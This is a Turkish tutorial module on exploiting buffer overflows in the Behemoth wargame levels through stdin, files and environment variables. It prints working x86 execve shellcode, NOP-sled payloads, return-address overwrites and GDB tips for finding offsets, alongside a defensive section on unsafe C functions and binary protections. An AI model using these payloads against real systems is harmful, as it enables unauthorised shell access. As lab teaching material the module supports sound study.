# Modül 4 — Gelişmiş Bellek Taşmaları ve Girdi Çeşitliliği

> **İlgili Seviyeler:** Behemoth1, Behemoth6, Behemoth7  
> **Anahtar Kavramlar:** Girdi kanalları, shellcode, dosya tabanlı exploit, environment variable  
> **Kazanım:** Aynı zafiyeti farklı saldırı yüzeylerinden sömürebilmek

---

## 🧠 1. Büyük Resim (Konsept Nedir?)

Narnia wargame'inde buffer overflow'u öğrenirken girdi hep aynı kanaldan geliyordu: komut satırı argümanı (`argv`). Binary'ye `./vulnerable AAAAAA...` yazıyordun ve stack taşıyordu.

Behemoth burada bir adım ileri gider: **aynı zafiyet (BOF), ama farklı girdi kanalı.** Bazen binary `stdin`'den okur, bazen bir dosyadan, bazen environment variable'dan. Saldırganın görevi — girdiyi nereye koymak gerektiğini anlamaktır.

Bir musluk düşün. Suyu farklı yerlerden verebilirsin: üstten, yandan, alttan. Musluğun içi her zaman aynı borudan geçiyor ama girişi farklı. Shellcode'u da bu girişlerden birine yerleştirirsin.

---

## 🔍 2. Zafiyetin Anatomisi (Neden Kaynaklanıyor?)

### Girdi kanalları haritası

```
Bir binary veriye nereden ulaşabilir?

argv (komut satırı)     ./program AAAA...
                                │
stdin (standart girdi)  echo "AAAA" | ./program
                                │
Dosya                   ./program ile açılan /tmp/shellcode
                                │
Environment variable    export SC="AAAA"; ./program
                                │
Network soketi          echo "AAAA" | nc localhost 1234
                                │
                        Hepsi aynı buffer'a yazabilir
                        Hepsi aynı stack'i taşırabilir
```

### Behemoth1 — `stdin` üzerinden BOF

Binary `gets()` veya `scanf()` ile kullanıcıdan girdi alıyor. `gets()` fonksiyonu buffer boyutunu umursamaz — ne kadar yazarsan yaz:

```c
int main() {
    char buffer[64];
    gets(buffer);    // ASLA kullanma — sınır yok
    // scanf("%s", buffer) da aynı şekilde tehlikeli
}
```

Stack düzeni:

```
Yüksek adres
─────────────────────
│   return address  │ ← EIP burası, bunu kontrol et
│   saved EBP       │
│   buffer[63]      │
│   buffer[62]      │
│   ...             │
│   buffer[0]       │ ← gets() buraya yazmaya başlar
─────────────────────
Düşük adres
```

`gets()` 64 byte'tan fazla girdi aldığında `saved EBP`'yi ve `return address`'i ezer.

Saldırı:

```bash
(python3 -c "
import sys
nop     = b'\x90' * 40          # NOP sled
shell   = b'\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80'
padding = b'A' * (71 - len(nop) - len(shell))
eip     = b'\xd0\xd5\xff\xff'   # Stack adresine dön
sys.stdout.buffer.write(nop + shell + padding + eip)
"; cat) | /behemoth/behemoth1
```

`; cat` neden var? Shell açıldıktan sonra stdin'i kapatmamak için. Pipe kapanırsa shell de kapanır.

### Behemoth6 — Dosya üzerinden shellcode enjeksiyonu

Behemoth6'da binary doğrudan shellcode'u argüman veya stdin'den almıyor. Bunun yerine bir helper binary çalıştırıyor ve bu helper belirli bir dosyadan shellcode okuyor:

```c
// behemoth6_reader'ın yaptığı (yaklaşık):
int main() {
    FILE *f = fopen("/tmp/behemoth6/shellcode", "rb");
    if (!f) { puts("Dosya bulunamadi"); return 1; }

    char shellcode[512];
    fread(shellcode, 1, sizeof(shellcode), f);
    fclose(f);

    // Okunan shellcode'u çalıştır
    void (*fn)() = (void(*)())shellcode;
    fn();
}
```

Saldırı: shellcode'u dosyaya yaz, binary okusun.

```bash
mkdir -p /tmp/behemoth6

# Shellcode'u binary olarak dosyaya yaz
python3 -c "
import sys
sys.stdout.buffer.write(
    b'\x31\xc0\x50\x68\x2f\x2f\x73\x68'
    b'\x68\x2f\x62\x69\x6e\x89\xe3\x50'
    b'\x53\x89\xe1\xb0\x0b\xcd\x80'
)" > /tmp/behemoth6/shellcode

/behemoth/behemoth6
# Shell açıldı
```

### Behemoth7 — Environment variable'dan shellcode

Behemoth7 argümandan BOF yapıyor ama stack korumaları veya kısıtlamalar nedeniyle shellcode'u doğrudan argümana koymak çalışmıyor olabilir. Çözüm: shellcode'u **environment variable**'a koy, daha büyük ve daha öngörülebilir bir alanda.

Environment variable'lar da stack üzerinde durur, ama `argv`'nin üzerinde ve daha yüksek adreslerde:

```
Yüksek adres
────────────────────
│  env string  n   │  ← SHELLCODE buraya
│  env string  2   │
│  env string  1   │
│  argv[0]         │
│  argc            │
│  ...             │
│  buffer[]        │  ← BOF buradan başlar
────────────────────
Düşük adres
```

```bash
# Shellcode'u environment'a koy
export SC=$(python3 -c "
import sys
sys.stdout.buffer.write(b'\x90'*200 + b'\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80')
")

# Adresini bul
cat > /tmp/find_env.c << 'EOF'
#include <stdio.h>
#include <stdlib.h>
int main(int argc, char *argv[]) {
    printf("SC adresi: %p\n", getenv("SC"));
    return 0;
}
EOF
gcc /tmp/find_env.c -o /tmp/find_env
/tmp/find_env
# SC adresi: 0xffffd8a0  ← bu adrese dön

# EIP'yi bu adrese yönlendir
/behemoth/behemoth7 $(python3 -c "print('A'*<OFFSET> + '\xa0\xd8\xff\xff')")
```

### NOP sled neden gereklidir?

Stack adresleri her çalıştırmada biraz kayabilir (ASLR hafif seviyede bile olsa). NOP sled (`\x90` baytları), hedefi büyütür:

```
Tam adres bilinmeden önce:
[???] ... [SHELLCODE]

NOP sled ile:
[NOP NOP NOP ... NOP NOP NOP NOP][SHELLCODE]
 ↑                               ↑
 Herhangi bir NOP'a              Shellcode
 düşsen de çalışır              burada başlar
```

NOP (`0x90`) x86'da "hiçbir şey yapma, bir sonraki komuta geç" demektir. 200 NOP + shellcode → hedef 200 byte genişledi.

### `\x31\xc0...` — bu shellcode ne yapıyor?

```asm
; execve("/bin//sh", NULL, NULL)

xor  eax, eax          ; \x31\xc0  — eax = 0 (temizle)
push eax               ; \x50      — null terminator
push 0x68732f2f        ; \x68...   — "//sh"
push 0x6e69622f        ; \x68...   — "/bin"
mov  ebx, esp          ; \x89\xe3  — ebx = "/bin//sh" adresi
push eax               ; \x50      — argv null
push ebx               ; \x53      — argv[0]
mov  ecx, esp          ; \x89\xe1  — ecx = argv
mov  al, 11            ; \xb0\x0b  — execve syscall numarası
int  0x80              ; \xcd\x80  — sistem çağrısı yap
```

Bu 23 bayt, Linux x86'da `/bin//sh` shell'ini açar. `//sh` yazmamızın nedeni: string 4 byte hizasında olsun diye (çift `/` geçerlidir).

---

## 🛠️ 3. Defansif Bakış Açısı (Nasıl Düzeltilir?)

### Tehlikeli fonksiyonlar ve güvenli alternatifleri

| Tehlikeli | Neden tehlikeli | Güvenli alternatif |
|-----------|-----------------|-------------------|
| `gets(buf)` | Sınır yok | `fgets(buf, sizeof(buf), stdin)` |
| `scanf("%s", buf)` | Sınır yok | `scanf("%63s", buf)` — genişlik belirt |
| `strcpy(dst, src)` | Sınır yok | `strncpy(dst, src, sizeof(dst)-1)` |
| `strcat(dst, src)` | Sınır yok | `strncat(dst, src, sizeof(dst)-1)` |
| `sprintf(buf, ...)` | Sınır yok | `snprintf(buf, sizeof(buf), ...)` |

### Modern koruma mekanizmaları

Gerçek dünya binary'lerinde bu exploit'leri zorlaştıran mekanizmalar vardır:

```bash
# Binary'nin koruma mekanizmalarını kontrol et
checksec /behemoth/behemoth1

# Örnek çıktı:
# RELRO:    No RELRO
# Stack:    No canary found   ← stack canary yok, BOF kolaylaşır
# NX:       NX disabled       ← stack çalıştırılabilir, shellcode çalışır
# PIE:      No PIE            ← sabit adresler, offset hesabı kolaylaşır
# ASLR:     disabled          ← adresler değişmiyor

# Korumalı bir binary:
# Stack:    Canary found      ← dönüş adresinden önce kontrol değeri var
# NX:       NX enabled        ← stack çalıştırılamaz (shellcode çalışmaz)
# PIE:      PIE enabled       ← her çalıştırmada farklı adres
# ASLR:     enabled           ← heap/stack adresleri rastgele
```

Behemoth kasıtlı olarak bu korumaları devre dışı bırakmış — eğitim ortamı. Gerçek sistemlerde hepsini aşmak çok daha zordur (ret2libc, ROP chains gibi ileri teknikler gerekir).

---

## 🚨 4. Yeni Başlayanların Düştüğü Tuzaklar

**Narnia'dan farklı: `argv` değil `stdin`.** Behemoth1'de `./behemoth1 AAAA` yazmak buffer'ı taşırmaz çünkü binary `argv`'yi değil `stdin`'i okuyor. Doğru yöntem:

```bash
# Yanlış — argüman olarak verme
/behemoth/behemoth1 $(python3 -c "print('A'*200)")

# Doğru — stdin üzerinden ver
python3 -c "import sys; sys.stdout.buffer.write(b'A'*200)" | /behemoth/behemoth1
```

**`; cat` unutmak.** Pipe'la shellcode gönderdiğinde, payload biter bitmez stdin kapanır ve shell de kapanır. `; cat` stdin'i açık tutar:

```bash
# Shell açılır ama hemen kapanır
python3 -c "..." | /behemoth/behemoth1

# Shell açılır ve etkileşimli kullanılabilir
(python3 -c "..."; cat) | /behemoth/behemoth1
```

**EIP adresini yanlış hesaplamak.** Offset bulmak için cyclic pattern kullan:

```bash
# GDB ile pattern oluştur
gdb /behemoth/behemoth1
(gdb) pattern create 200
(gdb) run       # stdin'e pattern'i yaz
(gdb) info registers eip
# eip değeri: 0x61616166
(gdb) pattern search 0x61616166
# pattern search: found at offset 71
```

**Dosya shellcode'unu yanlış yazmak.** Behemoth6'da shellcode dosyaya **binary** olarak yazılmalı, metin olarak değil:

```bash
# Yanlış — string olarak
echo "\x31\xc0..." > /tmp/behemoth6/shellcode

# Doğru — ham byte olarak
python3 -c "import sys; sys.stdout.buffer.write(b'\x31\xc0...')" > /tmp/behemoth6/shellcode

# Doğrula
xxd /tmp/behemoth6/shellcode | head -2
# 00000000: 31c0 5068 2f2f 7368 ...  ← ham byte görünmeli
```

**Environment variable boyutunun stack konumunu etkilemesi.** `getenv()` ile bulduğun adres binary'yi farklı argümanlarla çalıştırdığında kayabilir. Binary'ye exploit'i verirken `getenv` adresini aynı şartlar altında bul:

```bash
# Adres bulmak için aynı binary'yi kullan, aynı argument sayısıyla
gdb /behemoth/behemoth7
(gdb) break main
(gdb) run AAAA
(gdb) x/s *(char**)environ   # environment başlangıcı
```

### 🗺️ Gelişmiş İpucu: GDB ile Dış Dünya Arasındaki "Adres Kayması" (Stack Shift) Laneti

Environment variable (çevre değişkeni) kullanarak shellcode enjekte ederken (özellikle Behemoth7 gibi seviyelerde) yeni başlayanların %99'unun takıldığı devasa bir tuzak vardır: **"GDB içinde kusursuz çalışan exploit, GDB dışında neden SegFault (Core Dump) veriyor?"**

GDB içinde shellcode'unuzun adresini `0xffffd310` olarak bulursunuz, her şeyi ayarlarsınız, GDB içinde her şey tıkır tıkır çalışır ve shell'i alırsınız. Ancak aynı payload'u normal terminalde binary'ye gönderdiğinizde program çöker. 

#### 🕵️‍♂️ Arka Planda Ne Oluyor? (Neden Kaynaklanıyor?)
Linux'ta bir program başladığında, Stack bellek bölgesinin en tepesine iki şey yerleştirilir:
1. Programın çalıştırılma komutu (`argv[0]`)
2. Sistemdeki tüm çevre değişkenleri (`environ`)

Siz programı normal terminalde `./behemoth7` diye çalıştırırken, GDB içinde `/behemoth/behemoth7` gibi tam adresle çalıştırırsınız. Sadece bu iki string arasındaki karakter uzunluğu farkı bile, Stack üzerindeki tüm adreslerin **birkaç byte yukarı veya aşağı kaymasına** neden olur!

Daha da kötüsü, GDB kendi içinde çalışırken Stack'e `LINES` ve `COLUMNS` gibi terminal boyutunu belirten ekstra çevre değişkenleri enjekte eder. Bu yüzden GDB içindeki bellek haritası ile dış dünyadaki bellek haritası asla birebir aynı olmaz. Adresler genellikle 30 ila 100 byte arasında sapma gösterir.

#### 🛠️ Çözüm Çifti: Bu Lanetten Nasıl Kurtuluruz?

Bu adres sapmasını aşmak için gerçek dünya exploit geliştiricilerinin kullandığı iki altın yöntem vardır:

##### Yöntem A: Devasa Bir NOP Sled İniş Pisti Oluşturmak (Kaba Kuvvet)
Eğer çevre değişkenine koyduğunuz shellcode için bellekte yer kısıtlamanız yoksa, değişkeni sadece 20-30 byte NOP ile değil, **dağlar kadar NOP (`\x90`)** ile doldurun.
```bash
# 20 byte yerine 1000 byte NOP koyun:
export SC=$(python3 -c "import sys; sys.stdout.buffer.write(b'\x90'*1000 + shellcode)")
```
Böylece adres dışarıda 50 byte kaysa bile, hedef aldığınız adres hala o 1000 byte'lık devasa NOP pistinin (NOP Sled) ortasına denk gelecek ve işlemci shellcode'unuza güvenle kayarak ulaşacaktır.

## Yöntem B: GDB'yi Çevre Değişkenlerinden Arındırmak (Hassas Atış)

Eğer nokta atışı bir adrese ihtiyacınız varsa ve NOP koyacak yeriniz yoksa, GDB'yi başlatırken dış dünya ile Stack yapısını eşitlemek için şu komutları GDB içinde çalıştırın:
```bash
(gdb) unset env LINES
(gdb) unset env COLUMNS
(gdb) show env
```

Ayrıca programı GDB içinde çalıştırırken tam yolunu yazmak yerine, programın bulunduğu dizine gidip sadece ismiyle çağırarak argv[0] uzunluğunu dışarısıyla birebir aynı yapın.

Bu Stack kayması mekanizmasını anlamak, sizi saatlerce "Nerede hata yaptım?" diye debelenmekten kurtaracak ve exploit dünyasında sizi bir adım öne geçirecektir.

---

## Özet: Girdi Kanalı → Saldırı Stratejisi

```
Girdi kanalı       Tespit yöntemi          Exploit yöntemi
───────────────────────────────────────────────────────────
argv               ltrace: strcmp(argv[1]) ./prog $(python3 ...)
stdin              ltrace: read(0,...) veya python3 ... | ./prog
                   gets(), scanf()         (python3 ...; cat) | ./prog
Dosya              ltrace: fopen(path)     shellcode'u dosyaya yaz
Environment var    strings: getenv("X")   export X=$(python3 ...)
Network            ltrace: socket()+recv() nc / pwntools
───────────────────────────────────────────────────────────

Shellcode yerleşimi:
  Stack'te (NX disabled) → NOP sled + shellcode + EIP
  Env var'da             → büyük NOP sled + shellcode, yüksek stack
  Dosyada                → ham byte dosyasına yaz, binary okusun
```

---

## Kaynaklar

- `man 3 gets` — BUGS bölümüne bak: "Never use gets()"
- `man 3 fgets` — güvenli alternatif
- [shell-storm.org shellcode veritabanı](http://shell-storm.org/shellcode/)
- [pwntools dokümantasyonu](https://docs.pwntools.com/)
- [GDB peda / pwndbg](https://github.com/pwndbg/pwndbg) — exploit geliştirme için GDB eklentisi
- [Protostar wargame](https://exploit.education/protostar/) — daha detaylı BOF eğitimi
